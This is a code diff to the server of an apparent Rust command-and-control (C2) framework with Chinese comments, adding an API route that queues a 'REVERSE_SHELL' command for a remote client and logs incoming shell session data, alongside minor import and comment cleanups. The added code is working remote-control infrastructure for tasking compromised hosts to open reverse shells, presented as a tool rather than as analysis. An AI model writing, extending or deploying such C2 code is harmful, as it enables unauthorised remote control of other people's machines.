@@ -12,10 +12,10 @@ use std::net::TcpListener as StdTcpListener;
 use std::sync::Arc;
 use tokio::net::TcpListener as TokioTcpListener; // Alias Tokio's TcpListener
 use tokio::sync::RwLock;
-use tower_http::{cors::CorsLayer, services::ServeDir}; // Import Std TcpListener
+use tower_http::{cors::CorsLayer, services::ServeDir};
 
 // 引入common模块
-use rust_c2_framework::common::*;
+use common::*;
 
 /// 服务器状态
 #[derive(Clone)]
@@ -127,12 +127,22 @@ async fn handle_command_result(
 
 /// 处理Shell数据
 async fn handle_shell_data(
-    State(_state): State<ServerState>, // Fix: unused variable
+    State(_state): State<ServerState>,
     Json(message): Json<Message>,
 ) -> Result<StatusCode, StatusCode> {
-    // 这里可以实现Shell数据的处理和转发
-    println!("Received shell data: {} bytes", message.payload.len());
-    Ok(StatusCode::OK)
+    if let Ok(shell_data) = serde_json::from_slice::<ShellData>(&message.payload) {
+        // 这里可以实现Shell数据的处理和转发
+        println!("Received shell data from {}: {} bytes", 
+                shell_data.session_id, shell_data.data.len());
+        
+        // 可以在这里添加实时转发给Web界面的逻辑
+        // 比如通过WebSocket发送给前端
+        
+        Ok(StatusCode::OK)
+    } else {
+        println!("Received shell data: {} bytes", message.payload.len());
+        Ok(StatusCode::OK)
+    }
 }
 
 /// Web界面处理器
@@ -163,7 +173,7 @@ async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusC
     let template = IndexTemplate {
         clients: display_clients,
         online_clients_count,
-        os_types_count, // Pass the calculated count
+        os_types_count: os_types_count, // Pass the calculated count
     };
 
     match template.render() {
@@ -231,6 +241,42 @@ async fn api_command_results(
     Json(results)
 }
 
+/// 启动反弹Shell
+async fn initiate_reverse_shell(
+    State(state): State<ServerState>,
+    Path(client_id): Path<String>,
+) -> Result<StatusCode, StatusCode> {
+    // 创建反弹Shell会话
+    let session_id = uuid::Uuid::new_v4().to_string();
+    let shell_session = ShellSession {
+        client_id: client_id.clone(),
+        session_id: session_id.clone(),
+        created_at: chrono::Utc::now(),
+        is_active: true,
+    };
+
+    // 保存Shell会话
+    {
+        let mut sessions = state.shell_sessions.write().await;
+        sessions.insert(session_id.clone(), shell_session);
+    }
+
+    // 发送反弹Shell命令到客户端
+    let command = CommandRequest {
+        client_id: client_id.clone(),
+        command: "REVERSE_SHELL".to_string(),
+        args: vec![session_id],
+    };
+
+    let mut commands = state.commands.write().await;
+    commands
+        .entry(client_id)
+        .or_insert_with(Vec::new)
+        .push(command);
+
+    Ok(StatusCode::OK)
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let state = ServerState::new();
@@ -249,6 +295,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .route("/api/clients", get(api_clients))
         .route("/api/clients/:client_id/commands", post(send_command))
         .route("/api/clients/:client_id/results", get(api_command_results))
+        .route("/api/clients/:client_id/reverse_shell", post(initiate_reverse_shell))
         // 静态文件服务
         .nest_service("/static", ServeDir::new("web/static"))
         .layer(CorsLayer::permissive())
